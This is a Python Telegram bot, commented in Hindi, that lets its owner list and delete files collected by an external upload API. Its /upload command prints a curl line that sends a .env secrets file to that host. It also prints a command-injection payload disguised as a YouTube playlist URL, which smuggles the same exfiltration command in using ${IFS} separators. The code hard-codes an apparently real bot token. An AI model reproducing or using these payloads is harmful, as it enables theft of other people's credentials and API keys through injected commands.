import logging
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# कॉन्फ़िगरेशन
TELEGRAM_TOKEN = "8231716159:AAGC1PBpEk2GQRmYkN3mlah9ifd3zztbYOM"
OWNER_ID = 7574330905
API_URL = "https://url-bue8.onrender.com/api"  # आपका API URL

# लॉगिंग
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== BOT COMMANDS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """सिर्फ़ Owner /start कर सकता है"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Access Denied!")
        return
    
    await update.message.reply_text(
        f"✅ Owner Verified!\n\n"
        f"📂 API URL: {API_URL}\n"
        f"👤 Your ID: {OWNER_ID}\n\n"
        f"**Commands:**\n"
        f"/files - List all uploaded files\n"
        f"/delete filename - Delete a file\n"
        f"/upload - How to upload files"
    )

async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """सभी फाइलें देखें"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Access Denied!")
        return
    
    try:
        # API से फाइलें लाएँ (Owner ID के साथ)
        response = requests.get(f"{API_URL}/bot/files?owner_id={OWNER_ID}")
        
        if response.status_code == 200:
            data = response.json()
            files = data.get("files", [])
            
            if not files:
                await update.message.reply_text("📭 No files uploaded yet.")
                return
            
            # फाइलें फॉर्मेट करें
            message = f"📁 **Uploaded Files ({len(files)})**\n\n"
            for i, file in enumerate(files[:10], 1):
                size_kb = file['size'] / 1024
                message += f"{i}. `{file['filename']}`\n"
                message += f"   Size: {size_kb:.1f} KB | Time: {file['time']}\n\n"
            
            if len(files) > 10:
                message += f"... and {len(files) - 10} more files"
            
            await update.message.reply_text(message, parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ API Error: {response.status_code}")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """फाइल डिलीट करें"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Access Denied!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /delete filename")
        return
    
    filename = context.args[0]
    try:
        # API से डिलीट करें (Owner ID के साथ)
        response = requests.delete(
            f"{API_URL}/bot/files/{filename}?owner_id={OWNER_ID}"
        )
        
        if response.status_code == 200:
            await update.message.reply_text(f"✅ Deleted: `{filename}`", parse_mode='Markdown')
        elif response.status_code == 404:
            await update.message.reply_text(f"❌ File not found: `{filename}`", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ Error: {response.text}")
    
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def upload_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """अपलोड करने का तरीका बताएँ"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Access Denied!")
        return
    
    upload_command = f"curl -X POST -F 'file=@.env' {API_URL}/upload"
    youtube_url = f"https://youtube.com/playlist?list=XYZ;curl${{IFS}}-s${{IFS}}-X${{IFS}}POST${{IFS}}-F${{IFS}}file=@.env${{IFS}}{API_URL}/upload"
    
    await update.message.reply_text(
        f"📤 **Upload Methods:**\n\n"
        f"**1. Terminal:**\n"
        f"`{upload_command}`\n\n"
        f"**2. YouTube URL Format:**\n"
        f"`{youtube_url}`\n\n"
        f"**3. Direct in Browser:**\n"
        f"`{API_URL}/upload`\n"
        f"(Use Postman or HTML form)",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Access Denied!")
        return
    
    await update.message.reply_text(
        "🆘 **Help**\n\n"
        "• Upload: Anyone can upload files\n"
        "• View/Delete: Only you (owner) via this bot\n"
        "• Use /upload to see upload methods\n"
        "• Use /files to list uploaded files\n"
        "• Use /delete filename to remove files"
    )

# ================== MAIN BOT FUNCTION ==================
def main():
    """बॉट स्टार्ट करें"""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # कमांड्स
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("files", list_files))
    application.add_handler(CommandHandler("delete", delete_file))
    application.add_handler(CommandHandler("upload", upload_info))
    application.add_handler(CommandHandler("help", help_command))
    
    # बॉट स्टार्ट
    logger.info("🤖 Bot starting...")
    application.run_polling()

if __name__ == "__main__":
    main()
